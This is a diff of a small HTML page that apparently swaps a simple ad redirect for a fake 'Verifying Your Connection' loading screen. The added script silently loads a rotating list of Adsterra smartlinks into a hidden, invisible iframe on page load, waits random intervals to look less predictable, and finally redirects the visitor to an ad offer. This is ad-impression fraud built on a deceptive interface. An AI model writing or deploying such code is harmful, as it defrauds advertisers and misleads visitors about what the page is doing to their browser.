@@ -2,13 +2,126 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://www.profitableratecpm.com/prpxew2nr?key=53cbea8aa4b2110028d52465d87dd775/">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <!-- This meta tag immediately redirects the user to the specified URL. -->
-    <!-- The "0" means there is a zero-second delay. -->
+    <title>Loading Content...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+        .loader-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, #10B981, #3B82F6, #10B981);
+            background-size: 200% 200%;
+            border-radius: 9999px;
+            animation: progress-animation 2s linear infinite;
+        }
+        @keyframes progress-animation {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        #hiddenFrame {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            visibility: hidden;
+        }
+    </style>
 </head>
-<body>
-    <!-- The body is intentionally left empty for a direct redirect without displaying any content. -->
+<body class="bg-gray-900 flex items-center justify-center min-h-screen">
+
+    <div class="text-center text-white p-8 max-w-md w-full">
+        <svg class="mx-auto h-12 w-12 text-emerald-400 animate-spin mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+        </svg>
+        <h1 id="statusText" class="text-2xl font-bold mb-2">Verifying Your Connection...</h1>
+        <p class="text-gray-400 mb-6">Please wait while we prepare your content. This should not take long.</p>
+        
+        <div class="w-full bg-gray-700 rounded-full h-4 overflow-hidden relative">
+            <div class="loader-bar h-4 rounded-full"></div>
+        </div>
+        <p class="text-xs text-gray-500 mt-2">Do not close or refresh this page.</p>
+    </div>
+
+    <!-- This iframe loads the links in the background -->
+    <iframe id="hiddenFrame" src="about:blank"></iframe>
+
+    <script>
+        // === CONFIGURATION ===
+        const smartLinks = [
+            'https://www.profitableratecpm.com/prpxew2nr?key=53cbea8aa4b2110028d52465d87dd775', // Replace with your Adsterra Smartlinks
+            'https://www.profitableratecpm.com/ps7hvtshz?key=8ef8504a6cf1c9066352c5bf23a7202f',
+            'https://www.profitableratecpm.com/tf86dkw88c?key=6c1fd06de7b4b8741cba311fb2e07f69',
+            'https://www.profitableratecpm.com/jmphuudv0n?key=c9b608e226ec2bb6bdf35b19ae45898f'
+            // Add as many links as you want to cycle through
+        ];
+
+        // The final link to redirect the user to after the cycle is complete.
+        // Usually, this is your best converting offer or the first link again.
+        const finalRedirectUrl = 'https://www.profitableratecpm.com/pmgg2fand7?key=4ba7b8dd38a8aab5835572a77525f2fb';
+
+        // Time in seconds to wait on each link before loading the next one.
+        // Random between min and max.
+        const minDelaySeconds = 3;
+        const maxDelaySeconds = 6;
+        
+        // === SCRIPT LOGIC (DO NOT EDIT BELOW) ===
+        const statusText = document.getElementById('statusText');
+        const hiddenFrame = document.getElementById('hiddenFrame');
+        let currentLinkIndex = 0;
+
+        // Shuffle the array to make the rotation less predictable
+        function shuffleArray(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+        }
+
+        function loadNextLink() {
+            if (currentLinkIndex >= smartLinks.length) {
+                // All links have been loaded, perform the final redirect.
+                statusText.textContent = 'Redirecting...';
+                window.location.href = finalRedirectUrl;
+                return;
+            }
+            
+            // Update status for the user
+            statusText.textContent = `Loading asset (${currentLinkIndex + 1} of ${smartLinks.length})...`;
+            
+            // Load the current link into the hidden iframe
+            console.log(`Loading impression for: ${smartLinks[currentLinkIndex]}`);
+            hiddenFrame.src = smartLinks[currentLinkIndex];
+            
+            currentLinkIndex++;
+
+            // Set a random timeout for the next link
+            const delay = (Math.floor(Math.random() * (maxDelaySeconds - minDelaySeconds + 1)) + minDelaySeconds) * 1000;
+            setTimeout(loadNextLink, delay);
+        }
+
+        // --- SCRIPT START ---
+        window.onload = () => {
+            if (smartLinks.length === 0 || !finalRedirectUrl) {
+                statusText.textContent = 'Configuration Error';
+                console.error("ERROR: Add your Smartlinks and a final redirect URL to the script config.");
+                return;
+            }
+            shuffleArray(smartLinks);
+            loadNextLink();
+        };
+    </script>
 </body>
 </html>
